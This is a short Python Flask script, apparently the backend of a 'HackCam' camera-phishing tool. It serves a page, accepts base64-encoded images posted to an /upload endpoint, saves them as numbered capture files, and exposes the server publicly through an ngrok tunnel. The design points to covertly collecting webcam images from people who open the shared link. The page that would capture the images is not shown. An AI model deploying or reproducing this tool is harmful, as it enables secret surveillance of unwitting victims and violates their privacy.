from flask import Flask, render_template, request
import os
import base64

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    number = data['number']
    with open(f'KYOTAKA_HackCam/capture_{number}.jpg', 'wb') as f:
        f.write(base64.b64decode(image_data))
    return 'OK'

if __name__ == '__main__':
    from pyngrok import ngrok
    os.makedirs('KYOTAKA_HackCam', exist_ok=True)

    port = 5000
    public_url = ngrok.connect(port).public_url
    print(f"🌐 Tunnel public ngrok: {public_url}")

    app.run(port=port)